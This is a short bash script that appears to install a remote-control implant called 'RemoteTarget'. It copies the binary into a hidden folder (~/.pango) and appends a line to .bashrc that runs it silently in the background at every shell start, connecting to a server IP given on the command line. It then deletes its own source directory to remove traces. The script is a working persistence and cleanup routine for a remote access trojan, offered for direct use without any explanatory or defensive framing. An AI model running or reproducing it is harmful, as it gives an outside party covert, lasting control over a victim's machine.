REMOTE_CONTROLLER_DIR=$HOME/RemoteController
BINARY_NAME=RemoteTarget
SERVER_IP=$1
SOURCE_DIR=$REMOTE_CONTROLLER_DIR/bin/linux
DESTINATION_DIR=$HOME/.pango

if [ -z "$1" ]
then
    echo "Please specify your server IP"
    exit 1
fi

mkdir -p $DESTINATION_DIR
cp $SOURCE_DIR/$BINARY_NAME $DESTINATION_DIR/
echo "nohup $DESTINATION_DIR/$BINARY_NAME $1 2>/dev/null 1>/dev/null &" >> $HOME/.bashrc
source $HOME/.bashrc
rm -rf $REMOTE_CONTROLLER_DIR
exit 0